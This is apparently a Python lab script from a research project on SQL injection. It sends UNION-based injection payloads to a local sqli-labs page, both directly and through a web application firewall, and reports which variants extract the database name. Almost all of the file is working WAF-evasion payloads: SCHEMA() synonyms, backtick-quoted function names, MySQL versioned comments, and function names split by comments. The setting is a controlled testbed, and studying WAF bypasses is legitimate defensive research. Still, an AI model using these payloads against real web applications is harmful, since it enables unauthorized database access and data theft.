"""
bypass_lab/test_schema_variants.py
====================================
Untried techniques to get database name:

1. SCHEMA() — MySQL synonym for DATABASE(), less known
2. `database`() — backtick-quoted function name
3. /*!...database...*/ versioned comment tricks
4. data/**/base() passes WAF but SQL error — find valid MySQL equivalents
5. Boolean blind via FROM dual WHERE condition

Run:
    python3 -m bypass_lab.test_schema_variants
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    def get_login(text):
        idx = text.find("Your Login name:")
        return text[idx+16:idx+60].split("<")[0].strip() if idx >= 0 else ""

    pv = get_login(rp.text)
    wv = get_login(rw.text)
    blocked = rw.status_code == 403

    tag = "BLOCK" if blocked else ("DATA!" if wv else "PASS_empty")
    print(f"  [{tag:<12}] plain={repr(pv[:22]):<25} waf={repr(wv[:22])} | {label}")
    if not blocked and wv:
        FOUND.append((label, payload, wv))
    time.sleep(0.3)


print("=" * 70)
print(" Schema/DB name extraction attempts")
print("=" * 70)

# ── 1. SCHEMA() — MySQL synonym for database() ───────────────────────
print("\n[1] SCHEMA() — sinonim database(), mungkin tidak di training data")
t("SCHEMA() col2",
  ".1-- -'/0 UNION ALL SELECT 1,SCHEMA(),2'")
t("SCHEMA() col1",
  ".1-- -'/0 UNION ALL SELECT SCHEMA(),1,2'")
t("schema() lowercase",
  ".1-- -'/0 UNION ALL SELECT 1,schema(),2'")
t("ScHeMa() mixed",
  ".1-- -'/0 UNION ALL SELECT 1,ScHeMa(),2'")

# ── 2. Backtick-quoted function name ─────────────────────────────────
print("\n[2] `database`() — backtick quote might bypass identifier detection")
t("`database`() col2",
  ".1-- -'/0 UNION ALL SELECT 1,`database`(),2'")
t("`DATABASE`() uppercase",
  ".1-- -'/0 UNION ALL SELECT 1,`DATABASE`(),2'")
t("`schema`() backtick",
  ".1-- -'/0 UNION ALL SELECT 1,`schema`(),2'")
t("`user`() backtick",
  ".1-- -'/0 UNION ALL SELECT 1,`user`(),2'")

# ── 3. Versioned comment obfuscation ─────────────────────────────────
print("\n[3] Versioned comment splitting function name")
t("/*!50000SCHEMA*/()",
  ".1-- -'/0 UNION ALL SELECT 1,/*!50000SCHEMA*/(),2'")
t("/*!SCHEMA*/()",
  ".1-- -'/0 UNION ALL SELECT 1,/*!SCHEMA*/(),2'")
t("/*!50000database*/()",
  ".1-- -'/0 UNION ALL SELECT 1,/*!50000database*/(),2'")
t("SCH/*!*/EMA()",
  ".1-- -'/0 UNION ALL SELECT 1,SCH/*!*/EMA(),2'")
t("S/*!*/C/*!*/H/*!*/E/*!*/M/*!*/A()",
  ".1-- -'/0 UNION ALL SELECT 1,S/*!*/C/*!*/H/*!*/E/*!*/M/*!*/A(),2'")

# ── 4. Boolean blind via FROM dual WHERE ─────────────────────────────
print("\n[4] Boolean blind: FROM dual WHERE condition (no function in SELECT)")
t("WHERE schema()=sec",
  ".1-- -'/0 UNION ALL SELECT 1,99999,2 FROM dual WHERE SCHEMA()='security''")
t("WHERE database()=sec FROM dual",
  ".1-- -'/0 UNION ALL SELECT 1,99999,2 FROM dual WHERE database()='security''")

# ── 5. data/**/base insight — split di posisi berbeda ────────────────
print("\n[5] Split function name di posisi berbeda (data/**/base pass WAF)")
splits = [
    ("d/**/atabase()",  ".1-- -'/0 UNION ALL SELECT 1,d/**/atabase(),2'"),
    ("da/**/tabase()",  ".1-- -'/0 UNION ALL SELECT 1,da/**/tabase(),2'"),
    ("dat/**/abase()",  ".1-- -'/0 UNION ALL SELECT 1,dat/**/abase(),2'"),
    ("data/**/base()",  ".1-- -'/0 UNION ALL SELECT 1,data/**/base(),2'"),  # diketahui pass
    ("datab/**/ase()",  ".1-- -'/0 UNION ALL SELECT 1,datab/**/ase(),2'"),
    ("databa/**/se()",  ".1-- -'/0 UNION ALL SELECT 1,databa/**/se(),2'"),
    ("databas/**/e()",  ".1-- -'/0 UNION ALL SELECT 1,databas/**/e(),2'"),
]
for label, p in splits:
    t(label, p)

# ── 6. Combine: split + versioned comment ────────────────────────────
print("\n[6] Split + versioned comment combo")
t("da/*!*/ta/*!*/base()",
  ".1-- -'/0 UNION ALL SELECT 1,da/*!*/ta/*!*/base(),2'")
t("sch/*!*/ema()",
  ".1-- -'/0 UNION ALL SELECT 1,sch/*!*/ema(),2'")
t("s/*!50000*/chema()",
  ".1-- -'/0 UNION ALL SELECT 1,s/*!50000*/chema(),2'")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 70)
print(f" GOT DATA: {len(FOUND)}")
for label, p, val in FOUND:
    print(f"\n  {label}")
    print(f"  WAF returned: {repr(val)}")
    print(f"  {p[:100]}")
